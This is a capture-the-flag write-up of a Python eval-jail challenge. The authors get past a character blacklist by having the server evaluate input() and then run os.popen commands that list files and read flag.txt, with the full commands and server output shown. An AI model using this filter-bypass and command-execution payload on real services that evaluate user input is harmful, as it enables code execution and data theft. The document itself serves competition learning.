# Krampus' Return

> Author: howard41436 | 楊皓丞 | B06902097, devin6011 | 林首志 | B06902049

### Description

Krampus is back this Christmas, just like every Christmas! Make sure you get what you like from him ... and don't make hime mad!

### Solution

This is a interactive problem that we talk to Krampus and he talks back to us. When entering a string like `hi`, he answers random sentences. When I tried entering a number, Krampus answers exactly the same number. Something like this:

```
<You>: hi
<Server>: Krampus grows angry.
<You>: 3
<Krampus>: 3
```

So Krampus seems to evaluate our input, but when I entered `3+3`, random sentence appears, meaning the input is not valid. When I entered `globals()`, it works.

```
<You>: 3+3
<Elf #3200>: I should go investigate. Later.
<You>: globals()
<Krampus>: {'__builtins__': <module '__builtin__' (built-in)>, '__file__': '/chall/krampus.py', 'inp': 'globals()', '__package__': None, '__name__': '__main__', '__doc__': None}
```

I guess it blacklisted some characters in the input, after some tries, most special characters are blacklisted, including `'"[]{},.+-*/_` and many others. It's hard to create anything without using any of these special characters.

Then later we tried `input()`, and it works, it will take our input and evaluate it, bypassing all of the blacklists.

```
<You>: input()
3+3
<Krampus>: 6
<You>: input()
__import__("os").popen("ls").read()
<Krampus>: flag.txt
krampus.py
server.py
<You>: input()
__import__("os").popen("cat flag.txt").read()
<Krampus>: X-MAS{Th3_4ll_Mighty_pyth0n_b34t5_kr4mpu5_th1s_Xmas}
```

